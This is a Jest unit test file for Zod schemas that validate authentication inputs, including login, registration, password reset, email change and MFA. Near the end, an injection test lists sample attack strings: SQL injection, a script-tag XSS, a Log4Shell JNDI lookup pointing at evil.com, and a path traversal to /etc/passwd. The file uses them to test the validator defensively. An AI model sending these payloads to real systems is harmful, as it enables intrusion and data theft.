/**
 * Unit Tests for Zod Schema Validation
 * 
 * Tests all auth-related DTOs for proper validation,
 * error handling, and security constraints.
 */

import {
  LoginDto,
  RegisterDto,
  ForgotPasswordDto,
  ResetPasswordDto,
  ChangePasswordDto,
  ChangeEmailInitDto,
  ChangeEmailConfirmDto,
  ResendVerificationDto,
  MfaSetupDto,
  MfaConfirmDto,
  MfaDisableDto,
  VerifyEmailDto,
} from '@/lib/zod'

describe('LoginDto Validation', () => {
  test('should validate correct login data', () => {
    const validData = {
      email: 'user@example.com',
      password: 'SecurePassword123!',
    }

    const result = LoginDto.safeParse(validData)
    expect(result.success).toBe(true)
    
    if (result.success) {
      expect(result.data.email).toBe('user@example.com')
      expect(result.data.password).toBe('SecurePassword123!')
      expect(result.data.mfaCode).toBeUndefined()
    }
  })

  test('should validate login data with MFA code', () => {
    const validData = {
      email: 'user@example.com',
      password: 'SecurePassword123!',
      mfaCode: '123456',
    }

    const result = LoginDto.safeParse(validData)
    expect(result.success).toBe(true)
    
    if (result.success) {
      expect(result.data.mfaCode).toBe('123456')
    }
  })

  test('should reject invalid email format', () => {
    const invalidEmails = [
      'invalid-email',
      '@example.com',
      'user@',
      'user.example.com',
      '',
      ' ',
    ]

    invalidEmails.forEach(email => {
      const result = LoginDto.safeParse({
        email,
        password: 'SecurePassword123!',
      })
      expect(result.success).toBe(false)
    })
  })

  test('should reject empty password', () => {
    const result = LoginDto.safeParse({
      email: 'user@example.com',
      password: '',
    })
    expect(result.success).toBe(false)
  })

  test('should validate MFA code format', () => {
    const validMfaCodes = ['123456', '000000', '999999']
    const invalidMfaCodes = ['12345', '1234567', 'abcdef', '12345a', ' 123456']

    validMfaCodes.forEach(mfaCode => {
      const result = LoginDto.safeParse({
        email: 'user@example.com',
        password: 'SecurePassword123!',
        mfaCode,
      })
      expect(result.success).toBe(true)
    })

    invalidMfaCodes.forEach(mfaCode => {
      const result = LoginDto.safeParse({
        email: 'user@example.com',
        password: 'SecurePassword123!',
        mfaCode,
      })
      expect(result.success).toBe(false)
    })
  })

  test('should normalize email to lowercase', () => {
    const result = LoginDto.safeParse({
      email: 'USER@EXAMPLE.COM',
      password: 'SecurePassword123!',
    })

    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.email).toBe('user@example.com')
    }
  })
})

describe('RegisterDto Validation', () => {
  test('should validate correct registration data', () => {
    const validData = {
      email: 'user@example.com',
      password: 'SecurePassword123!',
      displayName: 'John Doe',
    }

    const result = RegisterDto.safeParse(validData)
    expect(result.success).toBe(true)
    
    if (result.success) {
      expect(result.data.email).toBe('user@example.com')
      expect(result.data.password).toBe('SecurePassword123!')
      expect(result.data.displayName).toBe('John Doe')
    }
  })

  test('should allow registration without display name', () => {
    const validData = {
      email: 'user@example.com',
      password: 'SecurePassword123!',
    }

    const result = RegisterDto.safeParse(validData)
    expect(result.success).toBe(true)
    
    if (result.success) {
      expect(result.data.displayName).toBeUndefined()
    }
  })

  test('should enforce password requirements', () => {
    const weakPasswords = [
      '12345',        // Too short
      '1234567',      // Still too short
      'password',     // No numbers/symbols
      '12345678',     // No letters
      'Password',     // No numbers
      'password123',  // No uppercase
      'PASSWORD123',  // No lowercase
    ]

    weakPasswords.forEach(password => {
      const result = RegisterDto.safeParse({
        email: 'user@example.com',
        password,
        displayName: 'John Doe',
      })
      expect(result.success).toBe(false)
    })
  })

  test('should accept strong passwords', () => {
    const strongPasswords = [
      'SecurePass123!',
      'MyP@ssw0rd',
      'Str0ng!Pass',
      'Complex@Password123',
      'Secure123$Pass',
    ]

    strongPasswords.forEach(password => {
      const result = RegisterDto.safeParse({
        email: 'user@example.com',
        password,
        displayName: 'John Doe',
      })
      expect(result.success).toBe(true)
    })
  })

  test('should reject very long passwords', () => {
    const tooLongPassword = 'a'.repeat(200) // > 128 characters
    
    const result = RegisterDto.safeParse({
      email: 'user@example.com',
      password: tooLongPassword,
      displayName: 'John Doe',
    })
    expect(result.success).toBe(false)
  })

  test('should validate display name constraints', () => {
    const validNames = [
      'John Doe',
      'María García',
      '李小明',
      'O\'Connor',
      'Jean-Pierre',
      'A', // Single character
    ]

    const invalidNames = [
      '', // Empty
      ' ', // Just space
      'A'.repeat(101), // Too long (> 100 chars)
    ]

    validNames.forEach(displayName => {
      const result = RegisterDto.safeParse({
        email: 'user@example.com',
        password: 'SecurePassword123!',
        displayName,
      })
      expect(result.success).toBe(true)
    })

    invalidNames.forEach(displayName => {
      const result = RegisterDto.safeParse({
        email: 'user@example.com',
        password: 'SecurePassword123!',
        displayName,
      })
      expect(result.success).toBe(false)
    })
  })
})

describe('ForgotPasswordDto Validation', () => {
  test('should validate correct email', () => {
    const result = ForgotPasswordDto.safeParse({
      email: 'user@example.com',
    })
    expect(result.success).toBe(true)
  })

  test('should reject invalid email', () => {
    const result = ForgotPasswordDto.safeParse({
      email: 'invalid-email',
    })
    expect(result.success).toBe(false)
  })

  test('should normalize email case', () => {
    const result = ForgotPasswordDto.safeParse({
      email: 'USER@EXAMPLE.COM',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.email).toBe('user@example.com')
    }
  })
})

describe('ResetPasswordDto Validation', () => {
  test('should validate correct reset data', () => {
    const validData = {
      token: 'valid-reset-token-123',
      password: 'NewSecurePassword123!',
    }

    const result = ResetPasswordDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should reject empty token', () => {
    const result = ResetPasswordDto.safeParse({
      token: '',
      password: 'NewSecurePassword123!',
    })
    expect(result.success).toBe(false)
  })

  test('should enforce password requirements', () => {
    const result = ResetPasswordDto.safeParse({
      token: 'valid-token',
      password: 'weak',
    })
    expect(result.success).toBe(false)
  })
})

describe('ChangePasswordDto Validation', () => {
  test('should validate correct change password data', () => {
    const validData = {
      currentPassword: 'OldPassword123!',
      newPassword: 'NewPassword123!',
    }

    const result = ChangePasswordDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should reject empty current password', () => {
    const result = ChangePasswordDto.safeParse({
      currentPassword: '',
      newPassword: 'NewPassword123!',
    })
    expect(result.success).toBe(false)
  })

  test('should enforce new password requirements', () => {
    const result = ChangePasswordDto.safeParse({
      currentPassword: 'OldPassword123!',
      newPassword: 'weak',
    })
    expect(result.success).toBe(false)
  })

  test('should allow same password validation (business logic handles rejection)', () => {
    const samePassword = 'SamePassword123!'
    const result = ChangePasswordDto.safeParse({
      currentPassword: samePassword,
      newPassword: samePassword,
    })
    // Schema validation should pass; business logic rejects identical passwords
    expect(result.success).toBe(true)
  })
})

describe('Email Change DTOs Validation', () => {
  test('should validate change email init data', () => {
    const validData = {
      newEmail: 'new@example.com',
      password: 'CurrentPassword123!',
    }

    const result = ChangeEmailInitDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should validate change email confirm data', () => {
    const validData = {
      token: 'valid-change-email-token',
    }

    const result = ChangeEmailConfirmDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should reject invalid new email format', () => {
    const result = ChangeEmailInitDto.safeParse({
      newEmail: 'invalid-email',
      password: 'CurrentPassword123!',
    })
    expect(result.success).toBe(false)
  })

  test('should normalize new email case', () => {
    const result = ChangeEmailInitDto.safeParse({
      newEmail: 'NEW@EXAMPLE.COM',
      password: 'CurrentPassword123!',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.newEmail).toBe('new@example.com')
    }
  })
})

describe('MFA DTOs Validation', () => {
  test('should validate MFA setup data', () => {
    const validData = {
      password: 'CurrentPassword123!',
      code: '123456',
    }

    const result = MfaSetupDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should validate MFA confirm data', () => {
    const validData = {
      secret: 'JBSWY3DPEHPK3PXP',
      code: '123456',
    }

    const result = MfaConfirmDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should validate MFA disable data', () => {
    const validData = {
      password: 'CurrentPassword123!',
      code: '123456',
    }

    const result = MfaDisableDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should reject invalid MFA codes', () => {
    const invalidCodes = ['12345', '1234567', 'abcdef', '']

    invalidCodes.forEach(code => {
      const setupResult = MfaSetupDto.safeParse({
        password: 'CurrentPassword123!',
        code,
      })
      expect(setupResult.success).toBe(false)

      const confirmResult = MfaConfirmDto.safeParse({
        secret: 'JBSWY3DPEHPK3PXP',
        code,
      })
      expect(confirmResult.success).toBe(false)
    })
  })

  test('should validate MFA secret format', () => {
    const validSecrets = [
      'JBSWY3DPEHPK3PXP',
      'ABCDEFGHIJKLMNOP',
      'MFRGG43FMZRW6Y3PNUYGW4TFOZSW42DMPFWW2IDCMFZWK3TU',
    ]

    const invalidSecrets = [
      '', // Empty
      'invalid-secret', // Invalid base32
      'JBSWY3DPEHPK3PX@', // Invalid character
      'jbswy3dpehpk3pxp', // Lowercase (should be uppercase)
    ]

    validSecrets.forEach(secret => {
      const result = MfaConfirmDto.safeParse({
        secret,
        code: '123456',
      })
      expect(result.success).toBe(true)
    })

    invalidSecrets.forEach(secret => {
      const result = MfaConfirmDto.safeParse({
        secret,
        code: '123456',
      })
      expect(result.success).toBe(false)
    })
  })
})

describe('Verification DTOs', () => {
  test('should validate resend verification data', () => {
    const validData = {
      email: 'user@example.com',
    }

    const result = ResendVerificationDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should validate email verification data', () => {
    const validData = {
      token: 'valid-verification-token',
    }

    const result = VerifyEmailDto.safeParse(validData)
    expect(result.success).toBe(true)
  })

  test('should reject empty verification token', () => {
    const result = VerifyEmailDto.safeParse({
      token: '',
    })
    expect(result.success).toBe(false)
  })
})

describe('Schema Security and Edge Cases', () => {
  test('should handle Unicode in email addresses', () => {
    // Valid internationalized domain names
    const unicodeEmails = [
      'user@münchen.de',
      'test@café.com',
      '用户@例子.测试',
    ]

    // Note: Our current email regex might not support all Unicode domains
    // This test documents current behavior and can be updated if needed
    unicodeEmails.forEach(email => {
      const result = LoginDto.safeParse({
        email,
        password: 'SecurePassword123!',
      })
      // Current implementation may reject Unicode domains
      // This is acceptable for security/compatibility reasons
    })
  })

  test('should handle very long email addresses', () => {
    const longEmail = 'a'.repeat(300) + '@example.com'
    
    const result = LoginDto.safeParse({
      email: longEmail,
      password: 'SecurePassword123!',
    })
    // Should reject overly long emails for security
    expect(result.success).toBe(false)
  })

  test('should trim whitespace from inputs', () => {
    const result = LoginDto.safeParse({
      email: '  user@example.com  ',
      password: 'SecurePassword123!',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.email).toBe('user@example.com')
    }
  })

  test('should handle null and undefined values', () => {
    const testCases = [
      { email: null, password: 'SecurePassword123!' },
      { email: undefined, password: 'SecurePassword123!' },
      { email: 'user@example.com', password: null },
      { email: 'user@example.com', password: undefined },
    ]

    testCases.forEach(testCase => {
      const result = LoginDto.safeParse(testCase)
      expect(result.success).toBe(false)
    })
  })

  test('should handle numeric values in string fields', () => {
    const result = LoginDto.safeParse({
      email: 123456,
      password: 789012,
    })
    expect(result.success).toBe(false)
  })

  test('should validate against injection attempts', () => {
    const injectionAttempts = [
      "'; DROP TABLE users; --",
      '<script>alert("xss")</script>',
      '${jndi:ldap://evil.com}',
      '../../../etc/passwd',
    ]

    injectionAttempts.forEach(attempt => {
      // Test in password field (should fail password requirements)
      const passwordResult = LoginDto.safeParse({
        email: 'user@example.com',
        password: attempt,
      })
      
      // Test in email field (should fail email validation)
      const emailResult = LoginDto.safeParse({
        email: attempt,
        password: 'SecurePassword123!',
      })
      
      // Both should fail due to format validation
      expect(passwordResult.success || emailResult.success).toBe(false)
    })
  })

  test('should handle maximum field lengths', () => {
    const maxLengthTests = [
      { field: 'displayName', maxLength: 100, dto: RegisterDto },
      { field: 'password', maxLength: 128, dto: RegisterDto },
    ]

    maxLengthTests.forEach(({ field, maxLength, dto }) => {
      // Test at maximum length (should pass)
      const atMaxData = {
        email: 'user@example.com',
        password: 'SecurePassword123!',
        displayName: 'Valid Name',
        [field]: field === 'password' ? 
          'SecurePass123!' + 'a'.repeat(maxLength - 14) : 
          'a'.repeat(maxLength),
      }
      
      const atMaxResult = dto.safeParse(atMaxData)
      expect(atMaxResult.success).toBe(true)

      // Test over maximum length (should fail)
      const overMaxData = {
        ...atMaxData,
        [field]: field === 'password' ? 
          'SecurePass123!' + 'a'.repeat(maxLength) : 
          'a'.repeat(maxLength + 1),
      }
      
      const overMaxResult = dto.safeParse(overMaxData)
      expect(overMaxResult.success).toBe(false)
    })
  })
})